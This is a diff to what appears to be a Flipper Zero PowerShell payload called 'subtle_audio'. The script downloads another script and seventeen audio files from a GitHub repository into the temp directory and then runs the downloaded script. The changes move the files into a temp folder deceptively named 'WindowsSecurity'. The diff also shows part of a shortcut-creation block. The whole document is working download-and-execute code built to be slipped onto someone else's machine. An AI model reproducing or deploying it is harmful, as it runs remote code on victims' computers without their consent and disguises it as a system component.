@@ -1,10 +1,13 @@
-$FilePath = "C:\temp\subtle_audio.ps1"
+
+New-Item -Path $env:temp -Name "WindowsSecurity" -ItemType "directory"; Set-Location -Path "$env:temp/WindowsSecurity"
+
+$FilePath = "$env:temp\WindowsSecurity\subtle_audio.ps1"
 
 $myDownloadUrl = "https://raw.githubusercontent.com/MattHinz03/Flipper-Scripts/main/subtle_audio/subtle_audio.ps1"
 Invoke-WebRequest $myDownloadUrl -OutFile $FilePath
 
 for (($i = 1); ($i -lt 18); ($i++)) {
-    Invoke-WebRequest "https://github.com/MattHinz03/Flipper-Scripts/raw/main/subtle_audio/$i.wav" -OutFile "C:\temp\$i.wav"
+    Invoke-WebRequest "https://github.com/MattHinz03/Flipper-Scripts/raw/main/subtle_audio/$i.wav" -OutFile "$env:temp\WindowsSecurity\$i.wav"
 }
 
 
@@ -19,4 +22,4 @@ $Shortcut.IconLocation = $WindowsPowerShell
 $Shortcut.WorkingDirectory = (Get-Item $WindowsPowerShell).DirectoryName
 $Shortcut.Save()
 
-& "C:/temp/subtle_audio.ps1"
+& "$env:temp/WindowsSecurity/subtle_audio.ps1"
